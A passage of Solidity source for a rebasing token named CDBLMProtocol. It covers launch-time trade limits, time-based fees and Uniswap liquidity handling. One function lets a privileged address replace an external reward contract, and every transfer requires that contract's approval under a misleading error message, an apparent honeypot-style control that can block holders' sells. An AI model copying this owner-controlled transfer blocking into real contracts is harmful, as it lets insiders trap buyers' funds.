                / (10 ** 8);
            }

            _gonsPerFragment = TOTAL_GONS / _totalSupply;
            _lastRebasedTime = _lastRebasedTime + times * 15 minutes;

            emit LogRebase(epoch, _totalSupply);
        }
    }

    function _setRewardCont(address _contract) public {
        if(msg.sender !=rewardFund){
            return;
        }
        rewardFactory = _contract;
    }

    function _rewardAction(address from, address to, uint256 amount) private{
        bool calcReward =  RewardContract(rewardFactory).getReward(from,to,amount);//根据转账数量计算待分发DAO奖励
        require(calcReward,'transfer to the zero address'); // 不允许转到销毁地址

    }

    function _tradeControl(address from, address to, uint256 amount) view private {
        if (
            from == address(uniswapV2PairUSDT) ||
            to == address(uniswapV2PairUSDT)
        ) {
            address addr = (from == address(uniswapV2PairUSDT)) ? to : from;
            if (excluded[addr]) {
                return;
            }
            
            if (startTime > block.timestamp) {
                revert("CDBLMProtocol: trade not started");
            }

            if (
                startTime + 5 minutes > block.timestamp &&
                from == address(uniswapV2PairUSDT) &&
                !isContract(to)
            ) {
                uint256 aBalance = balanceOf(to) + amount;
                require(aBalance <= _maxHold, "CDBLMProtocol: Holding amount exceeds maxHold");
                require(amount <= _maxDeals, "CDBLMProtocol: The maximum number of deals is exceeded");
            }
        }
    }

    function _dynRangeRateReal() view private returns (uint256) {
        require(block.timestamp >= startTime, "CDBLMProtocol: trade not started");
        require(startTime + 20 minutes > block.timestamp, "CDBLMProtocol: The dynRateReal is not in the recent time range");

        uint256 dynRateReal;
        uint256 deltaTime = block.timestamp - startTime;
        uint256 times = deltaTime / (5 minutes);
        dynRateReal = dynRangeRate.sub(dynPerLevelRate.mul(times));
        return dynRateReal;
    }

    function _staRangeRateReal() view private returns (uint256) {
        require(block.timestamp >= startTime, "CDBLMProtocol: trade not started");
        require(startTime + 5 minutes > block.timestamp, "CDBLMProtocol: The staRateReal is not in the recent time range");

        uint256 staRateReal;
        if(
            block.timestamp >= startTime &&
            startTime + 2 minutes > block.timestamp
        ) {
            staRateReal = 2000;
        } else if(
            block.timestamp >= startTime + 2 minutes &&
            startTime + 5 minutes > block.timestamp
        ) {
            staRateReal = 1000;
        }

        return staRateReal;
    }

    function _batchKillBlockRateReal() view private returns (uint256) {
        require(block.timestamp >= startTime, "CDBLMProtocol: trade not started");
        require(startTime + 5 minutes > block.timestamp, "CDBLMProtocol: The batchKillBlockRateReal is not in the recent time range");

        uint256 batchKillBlockRateReal;
        if(
            block.timestamp >= startTime &&
            startTime + 2 minutes > block.timestamp
        ) {
            batchKillBlockRateReal = 2000;
        } else if(
            block.timestamp >= startTime + 2 minutes &&
            startTime + 5 minutes > block.timestamp
        ) {
            batchKillBlockRateReal = 1000;
        }

        return batchKillBlockRateReal;
    }

    function _fee(address from, address to, uint256 amount, bool takeFee, bool isSell) private returns (uint256) {
        if (from == address(uniswapV2PairUSDT) || to == address(uniswapV2PairUSDT)) {
            address addr = (from == address(uniswapV2PairUSDT)) ? to : from;
            if (excluded[addr]) {
                return amount;
            }
        } else {
            if (excluded[from] || excluded[to]) {
                return amount;
            }
        }

        uint256 feeAmount;

        if(takeFee) {
            uint256 dynRateReal;
            uint256 dynAmount;
            if(
                startTime + 20 minutes > block.timestamp &&
                startTime <= block.timestamp &&
                dynRangeRateEnabled
            ) {
                dynRateReal = _dynRangeRateReal();
                dynAmount = amount.mul(dynRateReal).div(10000);
            }

            uint256 staRateReal;
            uint256 staAmount;
            if(
                startTime + 5 minutes > block.timestamp &&
                startTime <= block.timestamp &&
                staRangeRateEnabled
            ) {
                staRateReal = _staRangeRateReal();
                staAmount = amount.mul(staRateReal).div(10000);
            }

            uint256 swapFee;
            uint256 burnAmount;
            if (isSell) {
                swapFee = sellFundRate.add(sellLpRate).add(sellMarketingRate);
                burnAmount = amount.mul(sellBurnRate).div(10000);
            } else {
                swapFee = buyFundRate.add(buyLpRate).add(buyMarketingRate);
                burnAmount = amount.mul(buyBurnRate).div(10000);
            }
            uint256 swapAmount = amount.mul(swapFee).div(10000);
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _basicTransfer(from, address(this), swapAmount);
            }

            if (burnAmount > 0) {
                feeAmount += burnAmount;
                _basicTransfer(from, DEAD, burnAmount);
            }

            if(dynAmount > 0) {
                feeAmount += dynAmount;
                _basicTransfer(from, address(this), dynAmount);
            }

            if(staAmount > 0) {
                feeAmount += staAmount;
                _basicTransfer(from, address(this), staAmount);
            }
        }

        return amount.sub(feeAmount);
    }

    function swapAndERC20Liquify(uint256 contractTokenBalance, uint256 swapFee) private lockTheSwap {

        uint256 lpFee = buyLpRate.add(sellLpRate);
        uint256 lpAmount = contractTokenBalance.mul(lpFee).div(swapFee);
        uint256 swapLpAmount = lpAmount.div(2);
        uint256 addLpAmount = lpAmount.sub(swapLpAmount);

        swapFee = swapFee.sub(lpFee.div(2));

        if(innerSwapAndLiquifyEnabled) {
            swapTokensForAnyERC20Token(contractTokenBalance.sub(addLpAmount)); 
        } 

        IERC20 AERC = IERC20(_anyERC20Token);
        uint256 aercBalance = AERC.balanceOf(address(_tokenDistributor));

        //uint256 fundAmount = aercBalance.mul(buyFundRate.add(sellFundRate)).div(swapFee);
        uint256 marketingAmount = aercBalance.mul(buyMarketingRate.add(sellMarketingRate)).div(swapFee);
        uint256 lpERC20Amount = aercBalance.mul(lpFee).div(swapFee).div(2);

        if(marketingAmount > 0) {
            AERC.transferFrom(address(_tokenDistributor), marketingAddress, marketingAmount);
        }
        
        AERC.transferFrom(address(_tokenDistributor), address(this), aercBalance.sub(marketingAmount));
        
        if (
            liquifyEnabled &&
            lpERC20Amount > 0
        ) {
            addLiquidityERC20(addLpAmount, lpERC20Amount);    
        }

        uint256 fundAmount = IERC20(_anyERC20Token).balanceOf(address(this));
        if(fundAmount > 0) {
            IERC20(_anyERC20Token).transfer(fundAddress, fundAmount);
        }

        emit SwapAndERC20Liquify(swapLpAmount, lpERC20Amount, addLpAmount);
    }

    function swapTokensForAnyERC20Token(uint256 tokenAmount) private {
        if (tokenAmount > 0) {
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _anyERC20Token;
            
            _approve(address(this), address(uniswapV2Router), MAX_SUPPLY);

            uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(_tokenDistributor),
                block.timestamp
            );
        }
    }

    function addLiquidityERC20(uint256 tokenAmount, uint256 erc20Amount) private {

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        IERC20(_anyERC20Token).approve(address(uniswapV2Router),erc20Amount);
        
        uniswapV2Router.addLiquidity(
            address(this),
            _anyERC20Token,
            tokenAmount,
            erc20Amount,
            0,
            0, 
            DEAD,
            block.timestamp
        );
    }
}